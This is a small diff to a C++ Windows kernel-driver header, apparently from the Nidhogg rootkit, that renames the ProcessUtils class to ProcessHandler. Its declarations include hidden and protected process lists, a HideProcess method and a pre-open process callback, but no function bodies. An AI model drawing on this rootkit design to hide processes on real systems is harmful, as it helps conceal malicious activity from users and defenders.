@@ -49,7 +49,7 @@ struct ProcessSignature {
 	UCHAR SignatureSigner;
 };
 
-class ProcessUtils {
+class ProcessHandler {
 private:
 	ProcessList protectedProcesses;
 	ProcessList hiddenProcesses;
@@ -71,10 +71,10 @@ public:
 	}
 
 	_IRQL_requires_max_(APC_LEVEL)
-	ProcessUtils();
+	ProcessHandler();
 
 	_IRQL_requires_max_(APC_LEVEL)
-	~ProcessUtils();
+	~ProcessHandler();
 
 	_IRQL_requires_max_(DISPATCH_LEVEL)
 	bool FindProcess(_In_ ULONG pid, _In_ ProcessType type) const;
@@ -107,6 +107,6 @@ public:
 	NTSTATUS HideProcess(_In_ ULONG pid);
 };
 
-inline ProcessUtils* NidhoggProccessUtils;
+inline ProcessHandler* NidhoggProcessHandler;
 
 OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
